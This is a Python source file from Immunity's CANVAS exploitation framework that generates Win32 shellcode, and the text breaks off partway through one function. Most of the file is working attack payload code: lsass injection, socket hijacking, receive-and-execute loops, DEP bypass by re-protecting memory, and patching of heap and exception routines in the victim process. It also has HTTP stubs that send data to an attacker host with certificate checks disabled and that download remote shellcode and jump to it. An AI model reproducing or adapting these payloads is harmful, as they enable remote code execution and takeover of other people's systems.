#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  win32shellcodegenerator.py
## Description:  
##            :  
## Created_On :  Tue Aug 24 17:11:34 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Thu Aug 26 15:18:06 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

from x86shellcodegenerator import X86, shellfunc
import socket
from exploitutils import *
from MOSDEF import mosdef
from internal import *
import urllib

from engine import CanvasConfig

# IPv6 support addons
from win32ipv6 import win32ipv6

def getDaveHash(instr):
    """Does a simple hashing over a string"""
    hash=0
    for c in instr:
        d=ord(c)
        d=d | 0x60 #toupper
        hash+=d
        hash=uint32(long(hash) << 1)
    #print "%s:0x%08x" % (instr, hash)
    return hash

class win32func(shellfunc):
    pass

ActivationContextSelf ="""
        //activate context
        //.byte 0xcc

        pushl $0x1f21210a //RtlAllocateActivationContextStack mmmm
        pushl $0x0001b708 //ntdll
        call getfuncaddress

        pushl %eax //save eax

        xor %ecx,%ecx
        movw $0x18,%cx
        movl %fs:(%ecx),%eax
        lea 0x1a8(%eax),%ecx //get TEB (in ecx)

        popl %eax //restore eax
        pushl %ecx //argument (TEB) to RtlAllocateActivationContextStack

        call %eax

"""

VirtualAllocSelf = """
        //This way we move to a new page
        //.byte 0xcc

        pushl $0x000e3142 //virtualalloc
        pushl $0x000d4e88 //kernel32
        call getfuncaddress

        // get page of self
        movl %ebx,%esi
        andl $0xfffff000,%esi

        //virtualalloc
        pushl $0x40    //PAGE_EXECUTE_READWRITE
        pushl $0x1000  //MEM_COMMIT
        pushl $0x1000  //1 page        
        pushl $0x0     //doesnt matter address        
        call %eax      //VirtualAlloc

        //normalize ebx(our base for everything)
        and $0x00000fff,%ebx
        add %eax,%ebx //add our page

        //in esi we have our current page
        //and in edi our new page
        mov %eax,%edi
        //will move a page
        mov $0x1000,%ecx
        rep movsb

        //now we have to jump to our new code
        jmp jmp_seba
before_seba:
        pop %ecx //our eip        
        and $0x00000fff,%ecx //mask
        add %eax,%ecx //add our page
        jmp %ecx //jmp to the new address
jmp_seba:
        call before_seba
        //ecx points here but in our new page
"""

# this stub is used to virtualprotect the page we are executing in
# to +rwx .. to aid in defeating Vista DEP and whatnot
VirtualProtectSelf = """
vPSelf:
        //int3

        // get virtualprotect addie without writing to function table
        // we need to be able to prepend this stub before our import code?
        // so this stub needs to go BEFORE 'defaultwin32loadimports'

        pushl $0x0038d13c //virtualprotect
        pushl $0x000d4e88 //kernel32
        call getfuncaddress

        // get page of self
        movl %ebx,%edi
        andl $0xfffff000,%edi

        pushl %ecx // get dword space
        movl %esp,%ecx // pdword

        // vprotect page to +rwx
        pushl %ecx
        pushl $0x40 // + rwx
        pushl $0x1000 // page size
        pushl %edi // our page
        call %eax // VirtualProtect
"""

defaultWin32LoadImports="""
defaultWin32LoadImports:
        lea importhashes-geteip(%ebx),%esi
        lea functiontable-geteip(%ebx),%edi
load_one_dll:
        cld // clear direction flag for lodsl/stosl
        lodsl
        test %eax,%eax
        jz doneloadimports
.byte 0x91 //xchg %eax,%ecx
load_one_function:
        cld
        lodsl
        test %eax,%eax
        jz load_one_dll
        push %eax
        push %ecx
        call getfuncaddress
        cld
        stosl
        jmp load_one_function
doneloadimports:
"""

defaultWs232LoadImports="""
defaultWs232LoadImports:
        xorl %ecx,%ecx
        movl %fs:0x30(%ecx),%eax
        movl 0xc(%eax),%eax
        movl 0x1c(%eax),%ecx
searchWS2_32:
        movl (%ecx),%ecx
        movl 0x20(%ecx),%esi
        cld // clear direction flag for lodsl/stosl
        lodsl
        lodsl
        decl %esi
        addl (%esi),%eax
        cmpl $0x325f3332,%eax
        jne searchWS2_32
        movl 0x8(%ecx),%edx
        movl 0x3c(%edx),%ecx
        movl 0x78(%edx,%ecx,1),%ecx
        movl 0x1c(%edx,%ecx,1),%ecx
        addl %edx,%ecx
        lea ordinaltable-geteip(%ebx),%esi
        lea functiontable-geteip(%ebx),%edi
loadloop:
        xorl %eax,%eax
.byte 0x66
.byte 0xad //lodsw
        test %eax,%eax
        jz doneloadimports
        movl -0x4(%ecx,%eax,4),%eax
        addl %edx,%eax
        cld // clear direction flag for lodsl/stosl
        stosl
        jmp loadloop
doneloadimports:
"""



#ordinal numbers are always the same
ws2ordtable={}
ws2ordtable["recv"]=16
ws2ordtable["socket"]=23
ws2ordtable["connect"]=4
ws2ordtable["getpeername"]=5
ws2ordtable["listen"]=13
ws2ordtable["accept"]=1
ws2ordtable["bind"]=2
ws2ordtable["closesocket"]=3
ws2ordtable["select"]=18
ws2ordtable["WSAGetLastError"]=111
ws2ordtable["send"]=19


class win32(X86, win32ipv6):
    """
    When we do our get() we need to handle the imports.
    If we don't have any imports, we don't need to include
    our PE parsing code.
    We may also be able to hardcode a getprocaddress or
    other functions

    We want to be able to subclass of this for particular situtations
    such as when we know the service pack of the target, or we already
    know getprocaddress and loadlibrary (or any other functions)

    """
    def __init__(self):
        X86.__init__(self)

        self.handlers["UseWS2Ordinal"]=self.use_ws2_ordinal
        self.handlers["unhandled_exception_filter"]=self.unhandled_exception_filter
        self.handlers["GOFindSock"]=self.GOFindSock
        self.handlers["isapiGOFindSock"]=self.isapiGOFindSock
        self.handlers["IsapiRecvExecLoop"]=self.isapiRecvExecLoop
        self.handlers["IsapiSendInfo"]=self.IsapiSendInfo
        self.handlers["ASN1Stage0"]=self.ASN1Stage0
        self.handlers["RecvExecWin32"]=self.RecvExecWin32 
        self.handlers["SmallRecvExecWin32"]=self.SmallRecvExecWin32
        self.handlers["CreateThreadRecvExecWin32"]=self.CreateThreadRecvExecWin32 
        self.handlers["RecvExecLoop"]=self.RecvExecLoop
        self.handlers["RecvExecAllocLoop"]=self.RecvExecAllocLoop
        self.handlers["RecvExecDepSafe"]=self.RecvExecDepSafe
        self.handlers["LoadSavedRegAsFD"] = self.LoadSavedRegAsFD
        self.handlers["LoadRegAsFD"] = self.LoadRegAsFD
        self.handlers["loadFDasreg"] = self.loadFDasreg
        self.handlers["sendFD"] = self.sendFD
        self.handlers["sendGetProcandLoadLib"] = self.sendGetProcandLoadLib
        self.handlers["tcpconnect"]=self.tcpconnect
        self.handlers["tcpconnectMulti"]=self.tcpconnectMulti
        self.handlers["revert_to_self_before_importing_ws2_32"]=self.reverttoself_before_importing_ws2_32
        self.handlers["Fix RtlEnterCriticalSection"]=self.fix_rtlentercriticalsection
        self.handlers["Fix Heap"]=self.fix_heap
        self.handlers["debugme"]=self.debugme
        self.handlers["ForkLoad"]=self.ForkLoad
        self.handlers["ExitThread"]=self.exitthread
        self.handlers["TerminateThread"]=self.terminatethread
        self.handlers["NoExit"]=self.noexit
        self.handlers["HeapSafeInject"]=self.heapSafeInject
        self.handlers["InjectToSelfOld"]=self.InjectToSelfOld
        self.handlers['InjectToSelf'] = self.InjectToSelf
        self.handlers["DivByZero"]=self.divByZero #cause div by zero exception
        self.handlers["CreateThread"]=self.CreateThreadCode
        self.handlers["OrigamiInject"]=self.OrigamiInject #inject into lsass
        self.handlers["OrigamiInjectSmall"]=self.OrigamiInjectSmall #inject into lsass
        self.handlers["FindPeekSock"] = self.FindPeekSock #use MSG_PEEK to steal a socket
        self.handlers["BindMosdef"] = self.BindMosdef #bind to a socket
        self.handlers["winexec"] = self.winexec #execute one command
        self.handlers["SmallSearchCode"] = self.SmallSearchCode # a smaller adaptable single tag searchcode
        self.handlers["SearchCodeSafeSEH"] = self.SearchCodeSafeSEH   # Bypass any SafeSEH
        self.handlers["moveToStack"] = self.moveToStack
        self.handlers["httpGetShellcode"] = self.httpGetShellcode
        self.handlers["sendHttpInitData"] = self.sendHttpInitData
        self.handlers["MessageBox"] = self.MessageBox
        self.handlers["MessageBeep"] = self.MessageBeep
        self.handlers["ExitProcess"] = self.exitprocess
        self.handlers["TerminateProcess"]=self.terminateprocess
        self.handlers["SuspendThreads"]=self.suspendthreads
        self.handlers["send_universal"]=self.send_universal

        #default is not to revert to self and import ws2_32, so we assume
        #it is already loaded
        self.reverttoself_and_import=0
        self.endbuffer="endsploit:\n" #the end of our code has all the code that we
        #don't even include. We need to include a way for MOSDEF to know this.
        #returning the symbol table pointers would rock.
        self.foundeip=0 #have we called geteip of one fashion or another yet?
        self.initthreadid=0
        self.stringimports=[] #a list of the strings we also need to include

        self.useWS2ORDINAL=0

        # controls whether the shellcode should vprotect it's own page to +rwx
        self.vProtectSelf = False
        self.vAllocSelf   = False
        self.vActivationSelf = False

        # IPv6 support addons
        win32ipv6.__init__(self)
        self.handlers["IPv6ConnectBack"] = self.IPv6ConnectBack

        return

    def finalize(self):
        """Need to do the imports section, the put all the pieces
        together and assemble it with MOSDEF
        """

        #dont know where to put this
        self.imports.append("ntdll.rtlallocateactivationcontextstack")

        #print "Code=%s"%self.code

        #print "Imports= %s"%self.imports
        #we need some way to exit and it might need to import
        #symbols
        if self.exitcode=="" and not self.useWS2ORDINAL:
            #if we are in ordinal mode, we can't be importing from kernel32...
            self.exitprocess(None)

        ws2_32imports=[]
        doneimports={} #our list of the imports we've already done
        #first we need to build a list of the procedures 
        #we want to import for every DLL
        #print "self.imports=%s"%self.imports
        for name in self.imports:
            name=name.lower() #windows is not case sensitive
            proc=name.split(".")[1]
            name=name.split(".")[0]

            if name=="ws2_32" and (self.reverttoself_and_import or self.useWS2ORDINAL):
                if proc not in ws2_32imports:
                    ws2_32imports.append(proc)
                continue

            #add it to our dictionary if it doesn't exist
            if name not in doneimports:
                doneimports[name]=[]
            if proc not in doneimports[name]:
                doneimports[name]+=[proc]

        #importlongs=0
        #print "Doneimports: %s"  % doneimports
        if not self.useWS2ORDINAL:
            #now we have doneimports set up, and we can generate our 
            # #defines and import all the functions we need
            #while dllhash!=0:
            #  while prochash!=0:
            #     import(dllhash,prochash)
            #importbuffer="\nimporthashes:\n"
            #endbuffer="endsploit:\nfunctiontable:\n"

            dlls=[]
            self.addVariable("functiontable", None)

            for dll in doneimports:
                dllhash=getDaveHash(dll+".dll")
                #importbuffer+=".long 0x%8.8x //%s\n"%(dllhash,dll)
                dlls.append((long, dllhash, dll))

                #endbuffer+="%s:\n"%dll
                self.addVariable(dll, None)
                for func in doneimports[dll]:
                    #importlongs+=1
                    funchash=getDaveHash(func)

                    #importbuffer+=".long 0x%8.8x //%s\n"%(uint32(funchash),func)
                    dlls.append((long, uint32(funchash), func))

                    #endbuffer+="%s:\n.long 0x00000000\n"%func
                    self.addVariable(func, long)

                dlls.append((long, 0, "END"))
                #importbuffer+=".long 0x%8.8x //%s\n"%(0,"END")
            dlls.append((long, 0, "END OF DLLS"))
            #importbuffer+=".long 0x%8.8x //%s\n"%(0,"END OF DLLS")

            #now deal with win32 imports if necessary
            if self.reverttoself_and_import:
                ws_hashes=[]
                #importbuffer+="ws2_32hashes:\n"	
                self.addVariable("ws2_32hashes", None, "Start of our ws2_32 hashes for our import routine")
                dllhash=getDaveHash("WS2_32.DLL")
                #importbuffer+=".long 0x%8.8x //hash of ws2_32.dll\n"%dllhash
                ws_hashes.append((long, dllhash, "hash of ws2_32.dll"))
                #endbuffer+="ws2_32:\n"
                self.addVariable("ws2_32", None)
                donews2_32={}
                for proc in ws2_32imports:
                    if proc in donews2_32:
                        continue
                    donews2_32[proc]=1
                    funchash=getDaveHash(proc)
                    #importlongs+=1
                    #importbuffer+=".long 0x%8.8x //%s\n"%(funchash,func)
                    ws_hashes.append((long, funchash, func))
                    #endbuffer+="%s:\n.long 0x00000000\n"%proc
                    self.addVariable(proc, long)

                #importbuffer+=".long 0x%8.8x //%s\n"%(0,"END of WS2_32")
                ws_hashes.append((long, 0, "END OF WS2_32"))
            else:
                ws_hashes=None 
            self.addVariable({"importhashes":dlls})            
            if ws_hashes:
                #if we have done the imports after a revert to self
                #then we add this little table of ws2_32 hashes as well
                self.addVariable({"ws2_32hashes":ws_hashes})

            #todo, write loop that loads the imports
            if self.vActivationSelf:
                devlog("shellcode", "Using vActivationContext Self shellcode!")
                loadimports = ActivationContextSelf
            else:
                loadimports = ''
            if self.vProtectSelf:
                devlog("shellcode", "Using vProtect Self shellcode!")
                loadimports += VirtualProtectSelf + defaultWin32LoadImports
            elif self.vAllocSelf:
                devlog("shellcode", "Using VirtualAlloc and move page shellcode!")
                loadimports += VirtualAllocSelf + defaultWin32LoadImports
            else:
                loadimports += defaultWin32LoadImports

            for tup in self.stringimports:
                #name,value
                name,value=tup
                self.addVariable(name, str, "%s\x00" % value)                
                #importbuffer+="%s:\n"%name
                #importbuffer+=".urlencoded \"%s\"\n"%urllib.quote(value)
                #importbuffer+=".byte 0x00\n"

            self.prefix+=self.findeipcode+loadimports
            #endbuffer+="//variables\n"
            #for var in uniquelist(self.longs):
            #    importlongs+=1
                #endbuffer+="%s:\n.long 0x00000000\n"%var

            #self.postfix+=importbuffer
            fillimporttable=""
            if len(doneimports.keys())>0:
                self.requireFunctions(["getfuncaddress"])
        else:
            #If we get here, we ARE using the ordinal code for ws2_32!

            #print "findeip code is %s"%self.findeipcode
            #now we just use the ws2_32 ordinal code
            loadimports=defaultWs232LoadImports
            importbuffer=""
            for tup in self.stringimports:
                #name,value
                name,value=tup
                importbuffer+="%s:\n"%name
                importbuffer+=".ascii \"%s\"\n"%value
                importbuffer+=".byte 0x00\n"
            self.prefix+=self.findeipcode+loadimports
            #insert functions here

            fillimporttable=""
            self.postfix+="\nimportbuffer:\n"
            self.postfix+=importbuffer
            self.postfix+="\nexitprocess:\n"

            functiontable=""
            ordinaltable=""

            for proc in ws2_32imports:
                #print "Doing proc:%s"%proc
                #importlongs+=1
                functiontable+="%s:\n.long 0x00000000\n"%proc
                ordinaltable+="ordinal_%s:\n.short 0x%x\n"%(proc,ws2ordtable[proc])
            ordinaltable+="endordinaltable:\n.short 0x0\n" #end it with a null
            self.postfix+="\nordinaltable:\n"
            self.postfix+=ordinaltable

            #Cut off everything below here
            self.postfix+="\nfunctiontable:\n"
            self.postfix+=functiontable

            #print "Self.postfix=%s"%self.postfix

        self.funccode+=fillimporttable

        return X86.finalize(self)

    def use_ws2_ordinal(self,args):
        """
        just use the ws2_32 ordinal loader code
        """
        for imp in self.imports:
            if imp.split(".")[-1] not in ws2ordtable:
                print "Cannot import %s and then tell me to do ordinals"%imp
                raise SystemError
        #print "Using ordinal"
        self.useWS2ORDINAL=1
        return

    def fix_heap(self,args):
        """
        Patches RtlAllocate and RtlReAllocate and RtlFree to prevent old heaps
        from being used.
        Also patches KiUserException
        Creates a new global heap.
        Hopefully ReAlloc won't be too painful

        Uses int3 to capture rtlAlloc and rtlrealloc
        """
        code=""

        #now call createheap
        code+="""
LABELM14:
        //zero out eax for our pushes 
        xorl    %eax,%eax
        //push unknown argument of zero
        pushl   %eax
        //heapparams
        pushl   %eax
        //lock
        pushl   %eax
        //reserve
        pushl   %eax
        //base
        pushl   %eax
        //flags: set HEAP_GROWABLE
        pushl   $2 
        call    *rtlcreateheap-geteip(%ebx)
        movl    %eax, ourheap-geteip(%ebx)
        """

        #we don't do this anymore:
        #first make the unhandled exception handler point to us. This will
        #also handle int3 for us
        #YOU CAN'T CALL UNHANDLED EXCEPTION FILTER TWICE
        #well, you can, but it's a huge waste of space
        #self.unhandled_exception_filter(["heapfix"]) 


        code+="""
        //call virtualprotect to set +rwx flag on memory page
        //containing zwfreevirtualmemory, rtlallocateheap, rtlreallocateheap
        //scratch storage space for old values
        subl $50,%esp
        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        pushl rtlfreeheap-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)
        movl rtlfreeheap-geteip(%ebx), %ecx
        //ret 0x0c backwards
        movl $0x00000cc2,(%ecx)

        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        //memory address to unprotect
        pushl rtlallocateheap-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)
        movl rtlallocateheap-geteip(%ebx), %eax
        //this little section here defines if we are on XP or not,
        //which requires different emulation...
        xor %ecx, %ecx
        //.byte 0xcc
        cmpb $0x55, (%eax) //55 is push ebp
        jne isxp
        inc %ecx
        isxp:
        movl %ecx, emulate2k-geteip(%ebx)
        afterisxp:


        //debug
        //.byte 0xcc
        //now do kiuserexceptiondispatcher
        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        //memory address to unprotect
        pushl kiuserexceptiondispatcher-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)
        //patch it to call our code instead
        movl kiuserexceptiondispatcher-geteip(%ebx), %eax
        //mov %eax, %ecx
        movb $0x68, (%eax)
        inc %eax
        lea kiuserexceptiondispatchreplacement-geteip(%ebx), %ecx
        mov %ecx, (%eax)
        add $4, %eax
        movb $0xc3, (%eax)
        //we just moved a push $ouraddress, ret into the code. 6 bytes
        //were overwritten


        //we patch entercriticalsection and leavecriticalsection
        //to return and do nothing
        //which ruins our threadsafetyness
        //but is esential since we do so much from the unhandled exception handler
        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        //memory address to unprotect
        pushl rtlreallocateheap-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)

        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        //memory address to unprotect
        pushl rtlleavecriticalsection-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)
        movl rtlleavecriticalsection-geteip(%ebx), %ecx
        //ret 0x04 backwards
        movl $0x000004c2,(%ecx)        

        movl %esp,%eax
        pushl %eax
        //flags +rwx
        pushl $0x40
        //size
        pushl $8
        //memory address to unprotect
        pushl rtlentercriticalsection-geteip(%ebx)
        call *virtualprotect-geteip(%ebx)
        movl rtlentercriticalsection-geteip(%ebx), %ecx
        //ret 0x04 backwards
        movl $0x000004c2,(%ecx)

        addl $50,%esp //reclaim space
        """

        #now patch other functions
        #need to redirect call to our code, change the variable
        #and recall the original function
        #we do this by capturing int 3
        #and replacing the push ebp in both functions with int 3
        code+="""
        movl rtlallocateheap-geteip(%ebx),%ecx
        movb $0xcc,(%ecx)

        movl rtlreallocateheap-geteip(%ebx),%ecx
        movb $0xcc,(%ecx)
        """
        self.imports.append("kernel32.virtualprotect")
        self.imports.append("ntdll.rtlallocateheap")
        self.imports.append("ntdll.rtlreallocateheap")
        #self.imports.append("ntdll.zwfreevirtualmemory")
        self.imports.append("ntdll.rtlfreeheap")
        self.imports.append("ntdll.rtlentercriticalsection")
        self.imports.append("ntdll.rtlleavecriticalsection")
        self.imports.append("ntdll.kiuserexceptiondispatcher")

        self.imports.append("ntdll.rtlcreateheap")
        #self.longs.append("ourheap")
        self.addVariable("ourheap", long, 0)
        self.requireFunctions(["replacekiuser"])

        self.code+=code
        return


    def unhandled_exception_filter(self,args):
        """ 
        In some cases the target program will have other threads which cause
        exceptions (such as reading the heap) and cause our process to die.

        This little shellcode stub sets the unhandled exception point and kills off
        any threads that are not us, if they call it.

        If you're testing this, you will want to modify the code to allow unhandled
        exception filters to be called - typically this is a jz or jnz right after a
        QueryProcessInformation() in kernel32.UnhandledExceptionFilter()

        In Windows 2000 SP4 this is at 7c51bda6
        """
        fixheap=0
        if args!=None and len(args)>0:
            if args[0]=="heapfix":
                fixheap=1

        code=""
        if not self.initthreadid:
            code+="""

            //first we need to store our current thread ID
            call *getcurrentthreadid-geteip(%ebx)
            movl %eax,currentthread-geteip(%ebx)

            """
            self.initthreadid=1
            self.imports.append("kernel32.getcurrentthreadid")
            #self.longs.append("currentthread")
            self.addVariable('currentthread', long, 0)

        code+="""    
        lea MyUnhandledExceptionFilter-geteip(%ebx),%ecx
        //now we handle all exceptions, if we're not being debugged
        push %ecx
        call *setunhandledexceptionfilter-geteip(%ebx)
        """
        self.code+=code
        self.imports.append("kernel32.setunhandledexceptionfilter")
        if fixheap:
            self.requireFunctions(["heap_unhandled_exception"])
        else:
            self.requireFunctions(["unhandled_exception"])
        return

    def fix_rtlentercriticalsection(self,args):
        if 'SimpleFix' in args:
            simplefix=1
        code=""
        #code+=".byte 0xcc\n"
        if not simplefix:
            if not self.initthreadid:
                code+="""
        //first we need to store our current thread ID
        call *getcurrentthreadid-geteip(%ebx)
        movl %eax,currentthread-geteip(%ebx)
                """
                self.initthreadid=1
                self.imports.append("kernel32.getcurrentthreadid")
                #self.longs.append("currentthread")
                self.addVariable("currentthread", long, 0)
            code+="""
        lea myRtlEnterCriticalSection-geteip(%ebx),%ecx
        movl %ecx, (0x7ffdf020)
            """
            self.code+=code
            self.imports.append("ntdll.rtlentercriticalsection")
            self.requireFunctions(["myRtlEnterCriticalSection"])
        else:
            self.code+="""
        movl rtlentercriticalsection-geteip(%ebx),%eax
        movl %eax,(0x7ffdf020)
            """
            self.imports.append("ntdll.rtlentercriticalsection")
        return

    def fix_rtlleavecriticalsection(self,args):
        code=""
        #code+=".byte 0xcc\n"
        if not self.initthreadid:
            code+="""
        //first we need to store our current thread ID
        call *getcurrentthreadid-geteip(%ebx)
        movl %eax,currentthread-geteip(%ebx)

            """
            self.initthreadid=1
            self.imports.append("kernel32.getcurrentthreadid")
            #self.longs.append("currentthread")
            self.addVariable("currentthread", long, 0)
        code+="""
        lea myRtlLeaveCriticalSection-geteip(%ebx), %ecx
        movl %ecx, (0x7ffdf024) //global PEB pointer in Windows NT->XP
        """
        self.code+=code
        self.imports.append("ntdll.rtlleavecriticalsection")
        self.requireFunctions(["myRtlLeaveCriticalSection"])
        return

    def reverttoself_before_importing_ws2_32(self,args):
        """calls reverttoself, finds the full path of ws2_32.dll
        imports it, and initializes it - not needed if ws2_32.dll 
        is already imported and initialized in all cases...

        Some of you may ask "why does he do a loadlibary on the full path?"
        since this clearly wastes space in shellcode, etc, there must
        be a good reason right?
        This thread will tell you why:
        http://groups.google.com/group/microsoft.public.win32.programmer.kernel/browse_thread/thread/6876016140b8933d/12014aaae07679b5%2312014aaae07679b5
        To sum up: "." in your path in a XP box will sometimes
        cause loadlibrary to fail. This is a known bug.
        I'm not sure why no other shellcode does this. Perhaps they have not
        run into the bug?
        """

        win8_stub = """
loadadvapi32:
        leal advapi32dll-geteip(%%ebx), %%eax
        push %%eax
        call *loadlibrarya-geteip(%%ebx)
        pushl $0x%08x
        pushl $0x%08x
        call getfuncaddress
        call %%eax
        """ % (getDaveHash("reverttoself"),getDaveHash("advapi32.dll"))
        
        
        code= """
        xorl %eax,%eax
        movb $0x2,%ah
        subl %eax,%esp
        movl %esp,%ecx
        pushl %eax
        pushl %ecx
        call *getsystemdirectorya-geteip(%ebx)
        movl %esp,%esi
findendofsystemroot:
        cld // clear direction flag
        lodsb
        test %al,%al
        jnz findendofsystemroot
        decl %esi
        mov %esi,%edi
        leal ws2_32dll-geteip(%ebx),%esi
strcpyintobuf:
        cld // clear direction flag
        lodsb
        stosb
        test %al,%al
        jnz strcpyintobuf
        push %esp
        call *loadlibrarya-geteip(%ebx)
        test %eax,%eax
        jnz fullpathworked
        leal ws2_32dll-geteip(%ebx),%eax
        incl %eax
        pushl %eax
        call *loadlibrarya-geteip(%ebx)
fullpathworked:
        leal ws2_32hashes-geteip(%ebx),%esi
        leal ws2_32-geteip(%ebx),%edi
        cld // clear direction flag
        lodsl
.byte 0x91 //xchg %eax,%ecx
ws2_32_load_one_function:
        cld // clear direction flag
        lodsl
        test %eax,%eax
        je done_ws2_32_imports
        push %eax
        push %ecx
        call getfuncaddress
        cld // clear direction flag
        stosl
        jmp ws2_32_load_one_function

done_ws2_32_imports:
        pushl %esp
        movb $0x1,%ah
        movb $0x1,%al
        pushl %eax
        call *wsastartup-geteip(%ebx)
        """

        # XXX : this is a hack to support exploits/clientside/windows/adobe_flash_valueof
        include_win8_stub = False
        
        if args != None:
            include_win8_stub = args.get("win8_compatible", False)
        
        if include_win8_stub:
            self.code += win8_stub
        
        self.code+=code
        self.reverttoself_and_import=1
        self.imports.append("kernel32.getsystemdirectorya")
        self.imports.append("kernel32.loadlibrarya")
        self.imports.append("ws2_32.wsastartup")
        self.stringimports.append(("ws2_32dll","\\ws2_32.dll"))
        self.stringimports.append(("advapi32dll", "advapi32.dll"))
        return

    def debugme(self,args):
        self.code+=".byte 0xcc\n"
        return

    # XXX: sends over the http handle that is left
    # XXX: in ESI by httpGetShellcode, via a GET
    # XXX: needs a clientID in the URL to make sure
    # XXX: data ends up in the right data queue

    def sendHttpInitData(self, args):
        if not self.foundeip:
            self.findeip([0])

        code = """   
        // InternetOpen("Mozilla", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0)
        // 1. string is at MOZILLA-geteip(%ebx)
        // 2. INTERNET_OPEN_TYPE_PRECONFIG is 0
        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        leal MOZILLA-geteip(%ebx),%esi
        pushl %esi
        call *internetopena-geteip(%ebx)    
        movl %eax,HTTPHANDLE-geteip(%ebx)

        // POST so we don't care about bad chars

        pushl $0
        pushl $0
        pushl $3
        pushl $0
        pushl $0
        pushl HTTPPORT-geteip(%ebx)
        leal HTTPHOST-geteip(%ebx),%esi
        pushl %esi
        pushl HTTPHANDLE-geteip(%ebx)
        call *internetconnecta-geteip(%ebx)

        // hConnect in %eax 
        movl %eax,HCONNECT-geteip(%ebx)

        pushl $0
        pushl $FLAGS
        pushl $0
        pushl $0
        pushl $0
        leal CLIENTID-geteip(%ebx),%esi
        pushl %esi
        leal POST-geteip(%ebx),%esi
        pushl %esi
        pushl HCONNECT-geteip(%ebx)
        call *httpopenrequesta-geteip(%ebx)

        // hRequest in %eax
        movl %eax,HREQUEST-geteip(%ebx)

    // .. so it still works with invalid certs for eric
    // SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_UNKNOWN_CA |  
    // SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
    // SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_SET_MASK => 0x00003380

 //SET SSL OPTIONS

        pushl $0x00003380
        movl %esp,%esi
        pushl $4
        pushl %esi
        pushl $31 // INTERNET_OPTION_SECURITY_FLAGS
        pushl HREQUEST-geteip(%ebx)
        call *internetsetoptiona-geteip(%ebx)
        popl %eax // restore stack

    sendinit:

        pushl virtualfree-geteip(%ebx)
        pushl virtualalloc-geteip(%ebx)
        pushl internetsetoptiona-geteip(%ebx) // send internetsetoptiona
        pushl internetreadfile-geteip(%ebx) // send internetreadfile
        pushl internetclosehandle-geteip(%ebx) // send internetclosehandle
        pushl internetopenurla-geteip(%ebx) // send internetopenurla
        pushl internetopena-geteip(%ebx) // send internetopena (both for in and out)
        pushl httpsendrequesta-geteip(%ebx) // needed for post
        pushl httpaddrequestheadersa-geteip(%ebx) // needed for post
        pushl httpopenrequesta-geteip(%ebx) // needed for post
        pushl internetconnecta-geteip(%ebx) // needed for post
        pushl loadlibrarya-geteip(%ebx) // send loadlibrarya
        pushl getprocaddress-geteip(%ebx) // send getprocaddress
        pushl HTTPHANDLE-geteip(%ebx)

        // buf is esi, size is  13*4 == 52
        movl %esp,%esi

        pushl $56
        pushl %esi
        pushl $0
        pushl $0
        pushl HREQUEST-geteip(%ebx)
        call *httpsendrequesta-geteip(%ebx)

        // the body data is queued in the self.inbuffer of the HTTP-socket object

        pushl HCONNECT-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)
        pushl HREQUEST-geteip(%ebx)
        call *internetclosehandle-geteip(%ebx)

        // do a clean return here back into the parent HTTP loop

        movl %ebp,%esp
        popl %ebp
        ret
        """

        # enable correct SSL flags when needed (self.connection.ssl == 's')
        if 'SSL' in args.keys():
            if args['SSL'] == 's':
                code = code.replace('FLAGS', '0x84C03100')
            else:
                code = code.replace('FLAGS', '0x80400100')

        # STRINGS
        strings  = "jmp poststrings\n"
        strings += "MOZILLA:\n.ascii \"Mozilla\"\n.byte 0x00\n"
        strings += "HTTP:\n.ascii \"HTTP/1.0\"\n.byte 0x00\n"
        strings += "POST:\n.ascii \"POST\"\n.byte 0x00\n"
        strings += "HTTPHOST:\n.ascii \"%s\"\n.byte 0x00\n" % args["HTTPHOST"]
        strings += "CLIENTID:\n.ascii \"/c/%s\"\n.byte 0x00\n" % args["ID"]
        strings += "poststrings:\n"
        code += strings

        # WININET.DLL (loadlibrary and init funcs)
        self.imports.append("wininet.internetopena") # ANSI
        self.imports.append("wininet.internetopenurla") # ANSI
        self.imports.append("wininet.internetreadfile")
        self.imports.append("wininet.internetclosehandle")
        self.imports.append("wininet.internetconnecta")
        self.imports.append("wininet.httpsendrequesta")
        self.imports.append("wininet.httpaddrequestheadersa")
        self.imports.append("wininet.httpopenrequesta")
        self.imports.append("wininet.internetsetoptiona")

        # KERNEL32.DLL
        self.imports.append("kernel32.getprocaddress")
        self.imports.append("kernel32.loadlibrarya")

        self.imports.append("kernel32.virtualalloc")
        self.imports.append("kernel32.virtualfree")

        # LONGS
        self.addVariable("HTTPHANDLE", long, 0);
        self.addVariable("HREQUEST", long, 0);
        self.addVariable("HCONNECT", long, 0);
        self.addVariable("HTTPPORT", long, int(args["HTTPPORT"]))

        self.code += code
        return 

    def httpGetShellcode(self, args):
        """
        Goes to HTTP server as specified in args["URL"]
        and GETS /w. This will grab 4 bytes as size
        and then size bytes of data and then jump to that data

        We don't use WINHTTP because it wants us to pass in proxies
        The older wininet api grabs proxy data from 
        The server returns a shellcode blob
        http://msdn.microsoft.com/archive/default.asp?url=/archive/en-us/dnarwebtool/html/msdn_innetget.asp
        """

        if not self.foundeip:
            self.findeip([0])

        code = """
        //int3

	// we only want one instance running within the process ... to prevent race lockups on multiple triggers
        pushl INSTANCE-geteip(%ebx) // 0 by default in addVariable
        popl %eax 
        test %eax,%eax
        jnz httpExit
